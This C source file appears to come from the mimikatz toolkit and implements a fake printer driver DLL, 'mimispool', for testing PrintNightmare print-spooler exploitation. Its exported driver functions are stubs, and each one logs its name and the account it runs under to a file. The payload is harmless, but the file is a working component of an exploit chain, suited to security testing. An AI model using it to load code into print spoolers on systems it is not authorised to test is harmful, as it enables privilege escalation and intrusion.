/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "mimispool.h"

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	BOOL ret = TRUE;
	
	switch( ul_reason_for_call ) 
    { 
        case DLL_PROCESS_ATTACH:
			kspool(TEXT(__FUNCTION__) L"-PROCESS_ATTACH");
			ret = FALSE; 
			// FALSE avoid to keep library in memory (PrintNightmare < 3/4)
			// TRUE will mimic "real" driver/config -- to use/test with /useown on local (remote is not compatible with GetFileVersionInfo*)
            break;

        case DLL_THREAD_ATTACH:
			kspool(TEXT(__FUNCTION__) L"-THREAD_ATTACH");
            break;

        case DLL_THREAD_DETACH:
			kspool(TEXT(__FUNCTION__) L"-THREAD_DETACH");
            break;

        case DLL_PROCESS_DETACH:
			kspool(TEXT(__FUNCTION__) L"-PROCESS_DETACH");
            break;
    }

	return ret;
}

BOOL APIENTRY APIENTRY DrvQueryDriverInfo(DWORD dwMode, PVOID pBuffer, DWORD cbBuf, PDWORD pcbNeeded)
{
	BOOL status = FALSE;

	kspool(TEXT(__FUNCTION__));

	if ( dwMode == DRVQUERY_USERMODE)
	{
		*pcbNeeded = sizeof(DWORD);
		if (pBuffer && (cbBuf >= sizeof(DWORD)))
		{
			status = TRUE;
			*(DWORD *)pBuffer = TRUE;
		}
		SetLastError(ERROR_INSUFFICIENT_BUFFER);
	}
	else
	{
		SetLastError(ERROR_INVALID_PARAMETER);
	}

	return status;
}

BOOL APIENTRY DrvEnableDriver(ULONG iEngineVersion, ULONG cj, DRVENABLEDATA *pded)
{
	BOOL status = FALSE;

	kspool(TEXT(__FUNCTION__));

	if((iEngineVersion < 0x20000) || (cj < 0x10))
	{
		SetLastError(ERROR_BAD_DRIVER_LEVEL);
	}
	else
	{
		pded->iDriverVersion = 0x20000;
		pded->pdrvfn = NULL;
		pded->c = 0;
		status = TRUE;
	}

	return status;
}

VOID APIENTRY DrvDisableDriver()
{
	kspool(TEXT(__FUNCTION__));
}

VOID APIENTRY DrvResetConfigCache()
{
	kspool(TEXT(__FUNCTION__));
}

void kspool(LPCWSTR szFrom)
{
	FILE * kspool_logfile;
	WCHAR Buffer[256 + 1];
	DWORD cbBuffer = ARRAYSIZE(Buffer);

#pragma warning(push)
#pragma warning(disable:4996)
	if(kspool_logfile = _wfopen(L"mimispool.log", L"a"))
#pragma warning(pop)
	{
		klog(kspool_logfile, L"[" PLATFORM L"] [%s] as \'%s\'\n", szFrom, GetUserName(Buffer, &cbBuffer) ? Buffer : L"-");
		fclose(kspool_logfile);
	}
}

void klog(FILE * logfile, PCWCHAR format, ...)
{
	if(logfile)
	{
		va_list args;
		va_start(args, format);
		vfwprintf(logfile, format, args);
		va_end(args);
		fflush(logfile);
	}
}

DWORD WINAPI GenerateCopyFilePaths(LPCWSTR pszPrinterName, LPCWSTR pszDirectory, LPBYTE  pSplClientInfo, DWORD   dwLevel, LPWSTR  pszSourceDir, LPDWORD pcchSourceDirSize, LPWSTR  pszTargetDir, LPDWORD pcchTargetDirSize, DWORD dwFlags)
{
	kspool(TEXT(__FUNCTION__));
	return ERROR_SUCCESS;
}

BOOL WINAPI SpoolerCopyFileEvent(LPWSTR pszPrinterName, LPWSTR pszKey, DWORD  dwCopyFileEvent)
{
	kspool(TEXT(__FUNCTION__));
	return TRUE;
}